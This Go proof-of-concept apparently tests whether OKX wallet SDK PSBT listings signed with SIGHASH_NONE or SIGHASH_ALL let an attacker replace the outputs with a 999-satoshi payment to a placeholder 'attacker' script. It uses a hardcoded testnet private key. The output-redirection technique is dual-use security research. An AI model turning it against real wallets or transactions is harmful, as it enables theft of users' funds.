package main

import (
	"bytes"
	"encoding/base64"
	"encoding/hex"
	"fmt"

	"github.com/btcsuite/btcd/btcutil"
	"github.com/btcsuite/btcd/btcutil/psbt"
	"github.com/btcsuite/btcd/chaincfg"
	"github.com/btcsuite/btcd/chaincfg/chainhash"
	"github.com/btcsuite/btcd/txscript"
	"github.com/btcsuite/btcd/wire"
	"github.com/okx/go-wallet-sdk/coins/bitcoin"
	"github.com/btcsuite/btcd/btcec/v2/ecdsa"
)

const wif = "cPnvkvUYyHcSSS26iD1dkrJdV7k1RoUqJLhn3CYxpo398PdLVE22"

func main() {
	w, _ := btcutil.DecodeWIF(wif)
	pub := w.PrivKey.PubKey()
	pkh := btcutil.Hash160(pub.SerializeCompressed())
	addr, _ := btcutil.NewAddressWitnessPubKeyHash(pkh, &chaincfg.TestNet3Params)
	ownAddr := addr.EncodeAddress()

	in := &bitcoin.TxInput{TxId: "167170982fbbd65f11ee0aad09c519c5bf8d49ae81f730d03c3d606b1858abc0", VOut: 3, Amount: 1000, Address: ownAddr, PublicKey: hex.EncodeToString(pub.SerializeCompressed())}
	out := &bitcoin.TxOutput{Address: ownAddr, Amount: 546}
	res, _ := bitcoin.GenerateMPCUnsignedListingPSBT(in, out, &chaincfg.TestNet3Params)
	raw, _ := base64.StdEncoding.DecodeString(res.PsbtTx)
	psbtHex := hex.EncodeToString(raw)
	p0, _ := psbt.NewFromRawBytes(bytes.NewReader(raw), false)
	want, _ := bitcoin.PayToWitnessPubKeyHashScript(pkh)
	idx := -1
	for i := range p0.Inputs {
		if p0.Inputs[i].WitnessUtxo != nil && bytes.Equal(p0.Inputs[i].WitnessUtxo.PkScript, want) {
			idx = i
		}
	}

	for _, sh := range []int{0x02, 0x01} {
		opt := &bitcoin.SignPsbtOption{AutoFinalized: true, ToSignInputs: []*bitcoin.ToSignInput{{Index: idx, Address: ownAddr, SigHashTypes: []int{sh}}}}
		signed, err := bitcoin.SignPsbtWithKeyPathAndScriptPath(psbtHex, wif, &chaincfg.TestNet3Params, opt)
		if err != nil { fmt.Printf("CELL H1R-sign-0x%02x err=%v\n", sh, err); continue }
		sraw, _ := hex.DecodeString(signed)
		sp, _ := psbt.NewFromRawBytes(bytes.NewReader(sraw), false)
		for i := range sp.Inputs {
			if len(sp.Inputs[i].FinalScriptSig)+len(sp.Inputs[i].FinalScriptWitness) == 0 {
				sp.Inputs[i].FinalScriptWitness = []byte{0x00}
			}
		}
		tx, xerr := psbt.Extract(sp)
		if xerr != nil { fmt.Printf("CELL H1R-extract-0x%02x err=%v\n", sh, xerr); continue }
		sig := tx.TxIn[idx].Witness[0]
		scriptCode, _ := bitcoin.PayToPubKeyHashScript(pkh)

		mod := tx.Copy()
		attackerAddr, _ := btcutil.NewAddressWitnessPubKeyHash(bytes.Repeat([]byte{0x11}, 20), &chaincfg.TestNet3Params)
		attackerScript, _ := bitcoin.PayToWitnessPubKeyHashScript(bytes.Repeat([]byte{0x11}, 20))
		_ = attackerAddr
		mod.TxOut = nil
		mod.AddTxOut(wire.NewTxOut(999, attackerScript))
		prevOuts := map[wire.OutPoint]*wire.TxOut{}
		for i := range sp.Inputs {
			if sp.Inputs[i].WitnessUtxo != nil { prevOuts[tx.TxIn[i].PreviousOutPoint] = sp.Inputs[i].WitnessUtxo }
		}
		fetcher := txscript.NewMultiPrevOutFetcher(prevOuts)
		hashes := txscript.NewTxSigHashes(mod, fetcher)
		ht := txscript.SigHashType(sig[len(sig)-1])
		digest, derr := txscript.CalcWitnessSigHash(scriptCode, hashes, ht, mod, idx, sp.Inputs[idx].WitnessUtxo.Value)
		if derr != nil { fmt.Printf("CELL H1R-0x%02x digest err=%v\n", sh, derr); continue }
		parsed, perr := ecdsa.ParseDERSignature(sig[:len(sig)-1])
		ok := perr == nil && parsed.Verify(digest, pub)
		f0 := txscript.NewMultiPrevOutFetcher(prevOuts)
		d0, _ := txscript.CalcWitnessSigHash(scriptCode, txscript.NewTxSigHashes(tx, f0), ht, tx, idx, sp.Inputs[idx].WitnessUtxo.Value)
		p0sig, e0 := ecdsa.ParseDERSignature(sig[:len(sig)-1])
		fmt.Printf("CELL H1R-0x%02x original_valid=%v redirected_output(999 to 0x11..)_still_valid=%v\n", sh, e0 == nil && p0sig.Verify(d0, pub), ok)
		_ = chainhash.Hash{}
	}
}
